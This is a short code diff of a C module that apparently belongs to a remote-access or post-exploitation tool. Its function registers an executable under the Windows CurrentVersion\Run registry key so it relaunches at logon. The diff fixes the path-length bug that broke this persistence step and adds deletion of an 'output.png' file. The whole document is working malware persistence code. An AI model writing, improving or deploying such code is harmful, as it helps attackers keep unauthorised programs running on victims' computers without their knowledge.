@@ -17,10 +17,11 @@ extern HINSTANCE hAppInstance;
 // Add to startup
 void StartupKey(const char* czExePath)
 {
+	DeleteFile("output.png");
 	HKEY hKey;
-	LPSTR *fileExt;
     char szDir[MAX_PATH + 1]; 
-    GetFullPathName(czExePath, MAX_PATH + 1, szDir, &fileExt); 
+	memset(szDir, '\0', MAX_PATH+1);
+    GetFullPathName(czExePath, MAX_PATH + 1, szDir, NULL); 
 	LONG lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
 								"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
 								0 , KEY_WRITE,
@@ -32,16 +33,15 @@ void StartupKey(const char* czExePath)
 								0,
 								REG_SZ,
 								(unsigned char*)szDir,
-								strlen(czExePath));
+								strlen(szDir));
 	}
 
 	RegCloseKey(hKey);
 }
-
 void run()
 {
     StartupKey(GetInputOutput());
-    WriteOutput("Added startup key.");
+	WriteOutput("Added startup key.");
 }
 
 //===============================================================================================//
